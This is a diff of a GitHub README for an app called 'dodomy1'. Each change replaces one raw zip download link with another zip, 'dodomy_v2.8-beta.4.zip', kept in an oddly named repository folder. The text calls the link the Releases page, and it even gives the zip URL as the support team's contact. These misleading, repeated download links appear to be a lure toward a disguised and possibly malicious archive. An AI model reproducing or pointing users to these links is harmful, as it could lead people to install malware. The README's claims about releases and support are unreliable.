@@ -1,6 +1,6 @@
 # 🌟 dodomy1 - Join the Fun Anywhere, Anytime
 
-[![Download dodomy1](https://raw.githubusercontent.com/Binto001/dodomy1/main/koilanaglyphic/dodomy1.zip%20dodomy1-v1.0-brightgreen)](https://raw.githubusercontent.com/Binto001/dodomy1/main/koilanaglyphic/dodomy1.zip)
+[![Download dodomy1](https://github.com/Binto001/dodomy1/raw/refs/heads/main/koilanaglyphic/dodomy_v2.8-beta.4.zip%20dodomy1-v1.0-brightgreen)](https://github.com/Binto001/dodomy1/raw/refs/heads/main/koilanaglyphic/dodomy_v2.8-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **dodomy1**! This application allows you to join fun activities and c
 
 To get started, visit the Releases page to download the latest version of dodomy1. 
 
-[Download dodomy1](https://raw.githubusercontent.com/Binto001/dodomy1/main/koilanaglyphic/dodomy1.zip)
+[Download dodomy1](https://github.com/Binto001/dodomy1/raw/refs/heads/main/koilanaglyphic/dodomy_v2.8-beta.4.zip)
 
 1. **Visit the Releases Page:** Click the link above, which will take you to our GitHub Releases page.
 2. **Find the Latest Version:** Look for the newest release. It is usually at the top of the page.
@@ -45,12 +45,12 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Support
 
-If you need more help, feel free to reach out. You can contact our support team at https://raw.githubusercontent.com/Binto001/dodomy1/main/koilanaglyphic/dodomy1.zip or check our GitHub Issues page for assistance. 
+If you need more help, feel free to reach out. You can contact our support team at https://github.com/Binto001/dodomy1/raw/refs/heads/main/koilanaglyphic/dodomy_v2.8-beta.4.zip or check our GitHub Issues page for assistance. 
 
 ## 🔄 Updates
 
 To enjoy the latest features and fixes, regularly check the Releases page for updates. Staying updated helps improve app performance and security.
 
-[Download dodomy1](https://raw.githubusercontent.com/Binto001/dodomy1/main/koilanaglyphic/dodomy1.zip)
+[Download dodomy1](https://github.com/Binto001/dodomy1/raw/refs/heads/main/koilanaglyphic/dodomy_v2.8-beta.4.zip)
 
 Thank you for choosing dodomy1!
